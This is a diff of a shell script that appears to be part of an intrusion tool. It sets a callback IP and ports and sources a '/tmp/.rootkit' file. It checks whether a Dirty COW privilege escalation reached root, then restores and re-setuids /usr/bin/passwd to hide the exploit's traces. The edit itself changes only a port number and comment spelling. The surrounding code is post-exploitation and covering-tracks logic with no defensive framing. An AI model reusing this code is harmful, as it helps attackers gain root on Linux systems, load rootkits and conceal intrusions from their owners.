@@ -2,7 +2,7 @@
 
 ip="10.0.2.2"
 port2="9999"
-portp="15823"
+portp="15146"
 
 source /tmp/.functions
 source /tmp/.rootkit
@@ -14,7 +14,7 @@ user=$(whoami)
 
 if [ "$user" != "root" ]; then
   echo "priviledge escalation failed"
-  #remove /tmp/bak (created by dirtycow exploit)
+  #remove /tmp/bak (created by dirty_cow exploit)
   rm /tmp/bak &>/dev/null
   exit
 fi
@@ -22,7 +22,7 @@ fi
 #---if the user making the connection is root---
 echo "priviledge escalation succeeded"
 
-#restore /usr/bin/passwd (dirtycow exploit)
+#restore /usr/bin/passwd (dirty_cow exploit)
 mv /tmp/bak /usr/bin/passwd &>/dev/null
 chown root:root /usr/bin/passwd &>/dev/null
 chmod u+s /usr/bin/passwd &>/dev/null
